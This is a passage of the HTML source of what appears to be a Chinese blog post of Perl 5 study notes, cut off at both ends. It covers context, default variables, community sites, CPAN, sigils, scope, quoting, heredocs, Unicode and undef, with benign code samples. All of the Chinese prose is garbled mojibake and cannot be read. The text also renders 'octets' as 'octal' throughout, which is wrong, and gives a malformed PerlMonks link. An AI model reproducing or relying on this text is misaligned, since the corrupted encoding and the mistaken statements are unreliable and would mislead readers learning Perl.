class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @all_results = some_expensive_operation();<br><span class="hljs-keyword">my</span> ($single_element) = some_expensive_operation();<br>process_list_of_results(some_expensive_operation());<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>scalar</code> æ“ä½œç¬¦å¯ä»¥è¿«ä½¿å…¶åœ¨æ ‡é‡ä¸Šä¸‹æ–‡æ±‚å€¼.</p><p>åŸæœ¬çš„ä»£ç å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">process_list_of_results( some_expensive_operation() );<br><br><span class="hljs-keyword">my</span> %results = <br>(<br>    <span class="hljs-string">cheap_operation     =&gt;</span> $cheap_operation_results,<br>    <span class="hljs-string">expensive_operation =&gt;</span> some_expensive_operation(),<br>)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>expensive_operation</code> ä½äºåˆ—è¡¨ä¸Šä¸‹æ–‡, å› ä¸ºå“ˆå¸Œèµ‹å€¼éœ€è¦ä¸€ä¸ª <mark>é”®å€¼å¯¹åˆ—è¡¨</mark> , å¯¼è‡´å“ˆå¸Œèµ‹å€¼å†…çš„æ‰€æœ‰è¡¨è¾¾å¼åœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡æ±‚å€¼.</p><p>åŠ ä¸Š <code>scalar</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">process_list_of_results( some_expensive_operation() );<br><br><span class="hljs-keyword">my</span> %results = <br>(<br>    <span class="hljs-string">cheap_operation     =&gt;</span> $cheap_operation_results,<br>    <span class="hljs-string">expensive_operation =&gt;</span> <span class="hljs-keyword">scalar</span> some_expensive_operation(),<br>)<br></code></pre></td></tr></table></figure><h2 id="æ•°å€¼-å­—ç¬¦ä¸²åŠå¸ƒå°”ä¸Šä¸‹æ–‡"><a href="#æ•°å€¼-å­—ç¬¦ä¸²åŠå¸ƒå°”ä¸Šä¸‹æ–‡" class="headerlink" title="æ•°å€¼, å­—ç¬¦ä¸²åŠå¸ƒå°”ä¸Šä¸‹æ–‡"></a>æ•°å€¼, å­—ç¬¦ä¸²åŠå¸ƒå°”ä¸Šä¸‹æ–‡</h2><p>å­—ç¬¦ä¸²åœ¨ç”¨ä½œæ•°å­—æ—¶å€¼ä¸º 0.</p><p><code>==</code> æ“ä½œç¬¦å¼ºåˆ¶ <mark>æ•°å€¼ä¸Šä¸‹æ–‡</mark> </p><p><code>eq</code> æ“ä½œç¬¦å¼ºåˆ¶ <mark>å­—ç¬¦ä¸²ä¸Šä¸‹æ–‡</mark> </p><p><mark>å¸ƒå°”ä¸Šä¸‹æ–‡</mark> å‘ç”Ÿåœ¨å½“ä½ åœ¨æ¡ä»¶è¯­å¥ä¸­ä½¿ç”¨æŸå€¼æ—¶, å¦‚åœ¨ <code>if</code> è¯­å¥ä¸­ <code>eq</code> å’Œ <code>==</code> æ“ä½œçš„ç»“æœ.</p><p>ä¹Ÿå¯ä»¥åœ¨ä¸€äº›æƒ…å†µä¸‹æ˜ç¡®å¼ºåˆ¶ä¸Šä¸‹æ–‡:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $numeric_x =  <span class="hljs-number">0</span> + $x; <span class="hljs-comment"># å¼ºåˆ¶æ•°å€¼ä¸Šä¸‹æ–‡</span><br><span class="hljs-keyword">my</span> $stringy_x = <span class="hljs-string">&#x27;&#x27;</span> . $x; <span class="hljs-comment"># å¼ºåˆ¶å­—ç¬¦ä¸²ä¸Šä¸‹æ–‡</span><br><span class="hljs-keyword">my</span> $boolean_x =    !!$x; <span class="hljs-comment"># å¼ºåˆ¶å¸ƒå°”ä¸Šä¸‹æ–‡</span><br></code></pre></td></tr></table></figure><h2 id="éšå¼ç†å¿µ"><a href="#éšå¼ç†å¿µ" class="headerlink" title="éšå¼ç†å¿µ"></a>éšå¼ç†å¿µ</h2><h3 id="é»˜è®¤æ ‡é‡å˜é‡"><a href="#é»˜è®¤æ ‡é‡å˜é‡" class="headerlink" title="é»˜è®¤æ ‡é‡å˜é‡"></a>é»˜è®¤æ ‡é‡å˜é‡</h3><p><code>$_</code> æ˜¯é»˜è®¤æ ‡é‡å˜é‡.</p><p>å½“æ²¡æœ‰æ˜ç¡®æŒ‡å‡ºå‚æ•°æ—¶, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">print</span>; <span class="hljs-comment"># å°† `$_` æ‰“å°åˆ°å½“å‰æ‰€é€‰çš„æ–‡ä»¶å¥æŸ„</span><br><span class="hljs-keyword">say</span>; <span class="hljs-comment"># å°† `$_` æ‰“å°åˆ°å½“å‰æ‰€é€‰çš„æ–‡ä»¶å¥æŸ„</span><br></code></pre></td></tr></table></figure><p>å¦‚æœåœ¨ç”¨åˆ° <code>$_</code> çš„ä»£ç å†…è°ƒç”¨å‡½æ•°, æ— è®ºæ˜¯éšå¼è¿˜æ˜¯æ˜¾å¼, å¯èƒ½å¯¼è‡´ <code>$_</code> çš„å€¼è¢«è¦†ç›–.</p><p>Perl 5.10 å…è®¸ç”¨ <code>my</code> å°† <code>$_</code> ä½œä¸ºè¯æ³•å˜é‡æ¥å£°æ˜, é¿å…æ…ä¹±å¯¹ <code>$_</code> çš„åˆ©ç”¨, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> (<span class="hljs-keyword">my</span> $_ = &lt;STDIN&gt;)<br>&#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é»˜è®¤æ•°ç»„å˜é‡"><a href="#é»˜è®¤æ•°ç»„å˜é‡" class="headerlink" title="é»˜è®¤æ•°ç»„å˜é‡"></a>é»˜è®¤æ•°ç»„å˜é‡</h3><p>æœ‰ä¸¤ä¸ªéšå¼æ•°ç»„å˜é‡:</p><ul><li><code>@_</code> æ•°ç»„, å‘å‡½æ•°ä¼ é€’å‚æ•°</li><li><code>@ARGV</code> æ•°ç»„, ä¼ é€’å‘½ä»¤è¡Œå‚æ•°</li></ul><p><code>ARGV</code> çš„ä¸€ä¸ªç‰¹æ®Šç”¨æ³•: å¦‚æœä»ç©ºæ–‡ä»¶å¥æŸ„ <code>&lt;&gt;</code> è¯»å…¥, åˆ™ Perl ä¼šå°† <code>@ARGV</code> ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ å½“ä½œæ–‡ä»¶çš„åå­—æ‰“å¼€, å¦‚æœ <code>ARGV</code> ä¸ºç©º, Perl ä¼šä»æ ‡å‡†è¾“å…¥è¯»å–. </p><h1 id="Perl-å’Œå®ƒçš„ç¤¾åŒº"><a href="#Perl-å’Œå®ƒçš„ç¤¾åŒº" class="headerlink" title="Perl å’Œå®ƒçš„ç¤¾åŒº"></a>Perl å’Œå®ƒçš„ç¤¾åŒº</h1><h2 id="ç¤¾åŒºç½‘ç«™"><a href="#ç¤¾åŒºç½‘ç«™" class="headerlink" title="ç¤¾åŒºç½‘ç«™"></a>ç¤¾åŒºç½‘ç«™</h2><p>Perl çš„ä¸»é¡µä½äº <a href="http://www.perl.org/">http://www.perl.org</a></p><p><a href="http://www.perl.com/">http://www.perl.com</a>, æ¯æœˆå‘å¸ƒè‹¥å¹²å…³äº Perl ç¼–ç¨‹çš„æ–‡ç« å’Œæ•™ç¨‹.</p><p>PerlMonks, ä½äº <a href="http://perlmonks/">http://perlmonks</a>, ä¸“é—¨ç”¨äº Perl ç¼–ç¨‹é—®ç­”åŠå…¶ä»–è®¨è®º.</p><p>æä¾›æ–°é—»å’Œè¯„è®ºçš„ç¤¾åŒºç½‘ç«™, å¦‚ <a href="http://use.perl.org/">http://use.perl.org</a>, å’Œ <a href="http://blogs.perl.org/">http://blogs.perl.org</a></p><p>å±•ç¤º Perl é»‘å®¢ä»¬å¯¹ Perl æ²‰æ€çš„ç«™ç‚¹å¦‚ <a href="http://perlsphere.net/">http://perlsphere.net</a>, <a href="http://planet.perl.org/">http://planet.perl.org/</a>, ä»¥åŠ <a href="http://ironman.enlightenedperl.org/">http://ironman.enlightenedperl.org/</a>.</p><p>Perl Buzz ( <a href="http://perlbuzz.com/">http://perlbuzz.com/</a> ) å®šæœŸæ”¶é›†å¹¶é‡æ–°å‘å¸ƒä¸€äº›æœ€æœ‰è¶£, æœ‰ç”¨çš„ Perl æ–°é—».</p><h2 id="å¼€å‘ç½‘ç«™"><a href="#å¼€å‘ç½‘ç«™" class="headerlink" title="å¼€å‘ç½‘ç«™"></a>å¼€å‘ç½‘ç«™</h2><h2 id="æ´»åŠ¨"><a href="#æ´»åŠ¨" class="headerlink" title="æ´»åŠ¨"></a>æ´»åŠ¨</h2><p>YAPC â€“ Yet Another Perl Conference (åˆä¸€æ¬¡ Perl å¤§ä¼š), å¯å‚è§ <a href="http://yapc.org/">http://yapc.org</a></p><p>æœ¬åœ° Perl Monger å°ç»„, å‚è§ <a href="http://www.pm.org/">http://www.pm.org</a></p><h1 id="IRC"><a href="#IRC" class="headerlink" title="IRC"></a>IRC</h1><p>IRC æ˜¯ä¸€ç§å› ç‰¹ç½‘æ—©æœŸå‘å±•èµ·æ¥, åŸºäºæ–‡æœ¬çš„ç¾¤ç»„èŠå¤©ç³»ç»Ÿ.</p><p>Perl ç¤¾åŒºçš„ä¸» IRC æœåŠ¡å™¨æ˜¯ <a href="irc://irc.perl.org/">irc:&#x2F;&#x2F;irc.perl.org&#x2F;</a></p><h1 id="CPAN"><a href="#CPAN" class="headerlink" title="CPAN"></a>CPAN</h1><p>æ¯ä¸ª CPAN å‘è¡Œç‰ˆåœ¨ <a href="http://rt.cpan.org/">http://rt.cpan.org/</a> ä¸Šæœ‰å„è‡ªçš„å•æ®é˜Ÿåˆ—.</p><p><a href="http://learnperl.scratchcomputing.com/tutorials/configuration/">CPAN.pm é…ç½®æ•™ç¨‹</a></p><p><code>App::cpanminus</code> æ˜¯ä¸€ä¸ªæ–°å…´çš„ CPAN å®¢æˆ·ç«¯.</p><p><code>App::perlbrew</code> æ˜¯ä¸€ä¸ªå¯ä»¥ç®¡ç†å®‰è£…å¤šç‰ˆæœ¬ Perl çš„ç³»ç»Ÿ.</p><p><code>local::lib</code> CPAN å‘è¡Œç‰ˆè®©ä½ å¯ä»¥åœ¨è‡ªå·±çš„ç”¨æˆ·ç›®å½•ä¸‹å®‰è£…å’Œç®¡ç†å„ç±» CPAN æ¨¡å—.</p><h1 id="Perl-è¯­è¨€"><a href="#Perl-è¯­è¨€" class="headerlink" title="Perl è¯­è¨€"></a>Perl è¯­è¨€</h1><h2 id="åç§°"><a href="#åç§°" class="headerlink" title="åç§°"></a>åç§°</h2><p>å½“ <code>utf8</code> ç¼–è¯‘å‘½ä»¤ç”Ÿæ•ˆæ—¶, å¯ä»¥åœ¨æ ‡è¯†ç¬¦ä¸­ä½¿ç”¨ä»»æ„åˆæ³•çš„ UTF-8 å­—ç¬¦.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> utf8;<br><br><span class="hljs-keyword">my</span> $å“ˆ = <span class="hljs-string">&quot;haha&quot;</span>;<br><span class="hljs-keyword">print</span> $å“ˆ<br></code></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯æ­£ç¡®çš„.</p><h2 id="å˜é‡åå’Œå°è®°-sigil"><a href="#å˜é‡åå’Œå°è®°-sigil" class="headerlink" title="å˜é‡åå’Œå°è®° (sigil)"></a>å˜é‡åå’Œå°è®° (sigil)</h2><p><code>$</code>, <code>@</code>, <code>%</code> ä¸ºå˜é‡æä¾›äº†ä¸€äº›å‘½åç©ºé—´, ä½¿å¾—å¯ä»¥æ‹¥æœ‰åŒåä¸åŒå‹çš„å˜é‡:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> ($bad_name, @bad_name, %bad_name);<br></code></pre></td></tr></table></figure><p>è®¿é—®æ•°ç»„æˆ–å“ˆå¸Œä¸­çš„å¤šä¸ªå…ƒç´ , å³åˆ†ç‰‡:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @hash_elements = @hash&#123; @keys &#125;;<br><span class="hljs-keyword">my</span> @array_elements = @array[ @indexes ];<br></code></pre></td></tr></table></figure><h2 id="åŒ…é™å®šåç§°"><a href="#åŒ…é™å®šåç§°" class="headerlink" title="åŒ…é™å®šåç§°"></a>åŒ…é™å®šåç§°</h2><p><mark>ç±»çš„å®Œå…¨é™å®šåç§°</mark> ç”± <code>::</code> åˆ†éš”çš„åŒ…åç»„æˆ, å¦‚: <code>My::Fine::Package</code>.</p><p>ç…§æƒ¯ä¾‹, ç”¨æˆ·å®šä¹‰çš„åŒ…çš„åç§°é€šå¸¸ä»¥ <mark>å¤§å†™å­—æ¯å¼€å¤´</mark>. Perl ä¸º <mark>å†…å»ºç¼–è¯‘å‘½ä»¤ä¿ç•™äº†å°å†™åŒ…å</mark> , å¦‚ <code>strict</code> å’Œ <code>warning</code>.</p><p>å½“ Perl åœ¨ <code>Some::Package::Refinement</code> ä¸­æŸ¥æ‰¾æŸä¸€ç¬¦å·æ—¶, å®ƒå‘ <code>main::</code> ç¬¦å·è¡¨æŸ¥æ‰¾ä»£è¡¨ <code>some::</code> åç§°ç©ºé—´çš„ç¬¦å·, æ¥ç€å†åœ¨å…¶ä¸­æŸ¥æ‰¾ <code>Package::</code> åç§°ç©ºé—´, å¦‚æ­¤ç­‰ç­‰.</p><h2 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h2><h3 id="å˜é‡ä½œç”¨åŸŸ"><a href="#å˜é‡ä½œç”¨åŸŸ" class="headerlink" title="å˜é‡ä½œç”¨åŸŸ"></a>å˜é‡ä½œç”¨åŸŸ</h3><p>å¤§å¤šæ•°å˜é‡æ‹¥æœ‰è¯æ³•ä½œç”¨åŸŸ, æ–‡ä»¶ä¹Ÿæœ‰è‡ªå·±çš„è¯æ³•ä½œç”¨åŸŸ.</p><p>æ–‡ä»¶å†…éƒ¨çš„ <code>package</code> å£°æ˜å¹¶ä¸åˆ›å»ºæ–°çš„ä½œç”¨åŸŸ.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Store::Toy;<br><br><span class="hljs-keyword">our</span> $discount = <span class="hljs-number">0</span>.<span class="hljs-number">10</span>;<br><br><span class="hljs-keyword">package</span> Store::Music;<br><br><span class="hljs-comment"># $Store::Toy::discount ä»ç„¶å¯ä»¥é€šè¿‡ $discount è®¿é—®</span><br><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Our current discount is $discount!&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="å˜é‡å°è®°"><a href="#å˜é‡å°è®°" class="headerlink" title="å˜é‡å°è®°"></a>å˜é‡å°è®°</h3><p>è®¿é—®è¯¥å˜é‡æ‰€ç”¨çš„å°è®°å†³å®šäº†æ‰€è®¿é—®çš„å€¼çš„ç±»å‹.</p><h3 id="åŒ¿åå˜é‡"><a href="#åŒ¿åå˜é‡" class="headerlink" title="åŒ¿åå˜é‡"></a>åŒ¿åå˜é‡</h3><p>Perl 5 ä¸­çš„å˜é‡ä¸éœ€è¦åç§°, Perl èƒ½å¤Ÿå¦è¡Œåˆ†é…å­˜å‚¨ç©ºé—´è€Œä¸å¿…å°†ä»–ä»¬å­˜æ”¾åœ¨ lexical pad æˆ–æ˜¯ç¬¦å·è¡¨ä¸­, å…¶è¢«ç§°ä¸º <mark>åŒ¿åå˜é‡</mark> , è®¿é—®åˆ°å®ƒä»¬çš„å”¯åŠæ³•å°±æ˜¯é€šè¿‡å¼•ç”¨.</p><h3 id="å˜é‡-ç±»å‹å’Œå¼ºåˆ¶è½¬æ¢"><a href="#å˜é‡-ç±»å‹å’Œå¼ºåˆ¶è½¬æ¢" class="headerlink" title="å˜é‡, ç±»å‹å’Œå¼ºåˆ¶è½¬æ¢"></a>å˜é‡, ç±»å‹å’Œå¼ºåˆ¶è½¬æ¢</h3><p>æ–‡æ¡£ä¸­è®°è½½çš„è·å¾—æŸæ•°ç»„ä¸­å…ƒç´ ä¸ªæ•°çš„æ–¹å¼å°±æ˜¯åœ¨æ ‡é‡ä¸Šä¸‹æ–‡ä¸­å¯¹æ•°ç»„è¿›è¡Œæ±‚å€¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $count = @items;<br></code></pre></td></tr></table></figure><h2 id="å€¼"><a href="#å€¼" class="headerlink" title="å€¼"></a>å€¼</h2><h3 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h3><p>å­—ç¬¦ä¸²å®šä¹‰å¯ä»¥æ¨ªè·¨å¤šä¸ªé€»è¾‘è¡Œ, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $literal = <span class="hljs-string">&quot;two</span><br><span class="hljs-string">lines&quot;</span>;<br></code></pre></td></tr></table></figure><p><mark>å¦å¤–çš„å¼•å·æ“ä½œç¬¦</mark>:</p><ul><li><code>q</code> æ“ä½œç¬¦è¿›è¡Œå•å¼•å·æ“ä½œ</li><li><code>qq</code> æ“ä½œç¬¦è¿›è¡ŒåŒå¼•å·æ“ä½œ</li></ul><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $quote       = <span class="hljs-string">qq&#123;&quot;Ouch&quot;, he said. &quot;That hurt!&quot;&#125;</span>;<br><span class="hljs-keyword">my</span> $reminder    = <span class="hljs-keyword">q</span>^Didn<span class="hljs-string">&#x27;t need to escape the single quote!^;</span><br><span class="hljs-string">my $complaint   = q&#123;It&#x27;</span>s too early to be awake.&#125;;<br></code></pre></td></tr></table></figure><p><code>heredoc</code> çš„è¯­æ³•å…è®¸å¦ä¸€ç§æ–¹å¼è¿›è¡Œå¤šè¡Œå­—ç¬¦ä¸²èµ‹å€¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $blurb =&lt;&lt;<span class="hljs-string">&#x27;END_BLURB&#x27;</span>;<br><br>He looked up. <span class="hljs-string">&quot;Time is never on our side, my child. Do you see the irony?</span><br><span class="hljs-string">All they know is change. Change is the constant on which they all can</span><br><span class="hljs-string">agree. Whereas we, born out of time to remain perfect and perfectly</span><br><span class="hljs-string">self-aware, can only suffer change if we pursue it. It is against our</span><br><span class="hljs-string">nature. We rebel against that change. Shall we consider them greater</span><br><span class="hljs-string">for it?&quot;</span><br>END_BLURB<br></code></pre></td></tr></table></figure><p><code>&lt;&lt;&#39;END_BLURB&#39;</code> è¯­æ³•æœ‰ä¸‰ä¸ªéƒ¨åˆ†:</p><ul><li><code>&lt;&lt;</code> å¼•å…¥ heredoc</li><li><code>&#39;</code>, å¼•å·å†³å®šæ­¤ heredoc åœ¨å¤„ç†å˜é‡å†…æ’å’Œè½¬ä¹‰å­—ç¬¦æ—¶éµå¾ªå•å¼•å·è¿˜æ˜¯åŒå¼•å·çš„è§„åˆ™</li><li><code>END_BLURB</code> æ˜¯æ ‡è¯†ç¬¦</li></ul><p><mark>æ³¨æ„</mark>, ä¸ç®¡ heredoc å£°æ˜éƒ¨åˆ†ç¼©è¿›å¤šå°‘, ç»“æŸåˆ†éš”ç¬¦ä¸è®¸ä½äºä¸€è¡Œçš„å¼€å¤´. </p><h3 id="Unicode-and-Strings"><a href="#Unicode-and-Strings" class="headerlink" title="Unicode and Strings"></a>Unicode and Strings</h3><p>Perl 5 å¯ä»¥æŒ‰:</p><ul><li>Unicode å­—ç¬¦åºåˆ—</li><li>å…«è¿›åˆ¶åºåˆ—<br>è¡¨ç¤ºå­—ç¬¦ä¸².</li></ul><p>é»˜è®¤çš„, Perl å°†æ‰€æœ‰è¯»å…¥çš„æ•°æ®æŒ‰å…«è¿›åˆ¶åºåˆ—å¤„ç†.</p><h4 id="å­—ç¬¦ç¼–ç "><a href="#å­—ç¬¦ç¼–ç " class="headerlink" title="å­—ç¬¦ç¼–ç "></a>å­—ç¬¦ç¼–ç </h4><p>Unicode å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªè¡¨ç¤ºä¸€ç³»åˆ—å­—ç¬¦çš„å…«è¿›åˆ¶åºåˆ—. Unicode ç¼–ç å°†å…«è¿›åˆ¶åºåˆ—æ˜ å°„åˆ°å­—ç¬¦ä¸Š.</p><h4 id="æ–‡ä»¶å¥æŸ„ä¸­çš„-Unicode"><a href="#æ–‡ä»¶å¥æŸ„ä¸­çš„-Unicode" class="headerlink" title="æ–‡ä»¶å¥æŸ„ä¸­çš„ Unicode"></a>æ–‡ä»¶å¥æŸ„ä¸­çš„ Unicode</h4><p>ä¸å¯ç”¨ <code>utf8</code> æ¨¡å¼æ—¶, å‘æŸæ–‡ä»¶å¥æŸ„æ‰“å° Unicode å­—ç¬¦ä¸²ä¼šå¾—åˆ°ä¸€ä¸ªè­¦å‘Š (Wide character in %s), å› ä¸ºæ–‡ä»¶åŒ…å«çš„æ˜¯å…«è¿›åˆ¶æ•°æ®è€Œé Unicode å­—ç¬¦, æ‰“å¼€æ–¹å¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;&lt;:utf8&#x27;</span>, $textfile;<br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">binmode</span> $fh, <span class="hljs-string">&#x27;:utf8&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="æ•°æ®ä¸­çš„-Unicode"><a href="#æ•°æ®ä¸­çš„-Unicode" class="headerlink" title="æ•°æ®ä¸­çš„ Unicode"></a>æ•°æ®ä¸­çš„ Unicode</h4><p><code>Encode</code> æ ¸å¿ƒæ¨¡å—çš„ä¸¤ä¸ªå‡½æ•°:</p><ul><li><code>decode()</code></li><li><code>encode()</code></li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $string = decode(<span class="hljs-string">&#x27;utf8&#x27;</span>, $data);<br><span class="hljs-keyword">my</span> $latin1 = encode(<span class="hljs-string">&#x27;iso-8859-1&#x27;</span>, $string);<br></code></pre></td></tr></table></figure><h4 id="ç¨‹åºä¸­çš„-Unicode"><a href="#ç¨‹åºä¸­çš„-Unicode" class="headerlink" title="ç¨‹åºä¸­çš„ Unicode"></a>ç¨‹åºä¸­çš„ Unicode</h4><p>åœ¨ç¨‹åºä¸­åŒ…å« Unicode çš„ä¸‰ç§æ–¹å¼:</p><ul><li>ä½¿ç”¨ <code>utf8</code> ç¼–è¯‘å‘½ä»¤</li><li>ä½¿ç”¨ Unicode è½¬ä¹‰åºåˆ—, <code>\x&#123;&#125;</code> è¯­æ³•ä»£è¡¨ä¸€ä¸ªå•ç‹¬çš„å­—ç¬¦, å°†å­—ç¬¦çš„ Unicode æ•°å­—çš„åå…­è¿›åˆ¶è¡¨ç¤ºæ”¾å…¥å¤§æ‹¬å·å†…</li><li>ä½¿ç”¨ <code>charnames</code> ç¼–è¯‘å‘½ä»¤å¼€å¯ä½¿ç”¨ Unicode å­—ç¬¦çš„åç§°ä»¥åŠ <code>\N&#123;&#125;</code> è½¬ä¹‰è¯­æ³•</li></ul><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> utf8;<br><span class="hljs-keyword">my</span> $æ° = <span class="hljs-string">&#x27;jie&#x27;</span>;<br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $escape_thorn = <span class="hljs-string">&quot;\x&#123;00FE&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> charnames <span class="hljs-string">&#x27;:full&#x27;</span>;<br><span class="hljs-keyword">use</span> Test::More <span class="hljs-string">tests =&gt;</span> <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">my</span> $escape_thorn = <span class="hljs-string">&quot;\x&#123;00FE&#125;&quot;</span>;<br><span class="hljs-keyword">my</span> $named_thorn = <span class="hljs-string">&quot;\N&#123;LATIN SMALL LETTER THORN&#125;&quot;</span>;<br><br>is( $escape_thorn, $named_thorn, <span class="hljs-string">&#x27;Thorn equivalence check&#x27;</span> );<br></code></pre></td></tr></table></figure><h4 id="éšå¼è½¬æ¢"><a href="#éšå¼è½¬æ¢" class="headerlink" title="éšå¼è½¬æ¢"></a>éšå¼è½¬æ¢</h4><p>å¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²éƒ½æ˜¯å…«è¿›åˆ¶æµ, Perl ä¼šå°†å®ƒä»¬æ‹¼æ¥ä¸ºä¸€ä¸ªæ–°çš„å…«è¿›åˆ¶å­—ç¬¦ä¸².</p><p>å¦‚æœä¸¤è€…çš„éƒ½ä¸ºç¼–ç æ–¹å¼ç›¸åŒçš„å…«è¿›åˆ¶å€¼, åˆ™æ‹¼æ¥æ“ä½œæ­£å¸¸æ‰§è¡Œ.</p><p>å¦‚æœä¸¤è€…å¹¶ä¸å…±ç”¨ç¼–ç æ–¹å¼, ç”Ÿæˆä¸¤ç§ç¼–ç æ–¹å¼éƒ½æ— æ³•è¯†åˆ«çš„å…«è¿›åˆ¶åºåˆ—.</p><p>å‚è§ <code>perldoc perluniintro</code>.</p><h3 id="æ•°å­—"><a href="#æ•°å­—" class="headerlink" title="æ•°å­—"></a>æ•°å­—</h3><p>è¯¦ç»†å‚è€ƒ <code>perldoc perlnumber</code>.</p><h3 id="Undef"><a href="#Undef" class="headerlink" title="Undef"></a>Undef</h3><p>Perl 5 ä¸­ç”± <code>undef</code> ä»£è¡¨æ‰€æœ‰æœªèµ‹å€¼, æœªå®šä¹‰å’ŒæœªçŸ¥çš„å€¼, ä»¥å£°æ˜ä½†æœªå®šä¹‰çš„æ ‡é‡åŒ…å« <code>undef</code>.</p><p>åœ¨å¸ƒå°”ä¸Šä¸‹æ–‡ä¸­å¯¹ <code>undef</code> æ±‚å€¼å¾—åˆ°å‡.</p><h4 id="ç©ºåˆ—è¡¨"><a href="#ç©ºåˆ—è¡¨" class="headerlink" title="ç©ºåˆ—è¡¨"></a>ç©ºåˆ—è¡¨</h4><p>ç©ºåˆ—è¡¨åœ¨æ ‡é‡ä¸Šä¸‹æ–‡ä¸­æ±‚å€¼æ—¶å¾—åˆ° <code>undef</code>.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $test = () <span class="hljs-comment"># è¿™é‡Œçš„ test å°±æ˜¯ undef</span><br></code></pre></td></tr></table></figure><p>è®¡ç®—ä¸€ä¸ªè¡¨è¾¾å¼åœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡ä¸­è¿”å›ç»“æœçš„ä¸ªæ•°, å¯ä»¥ä½¿ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $count = () = 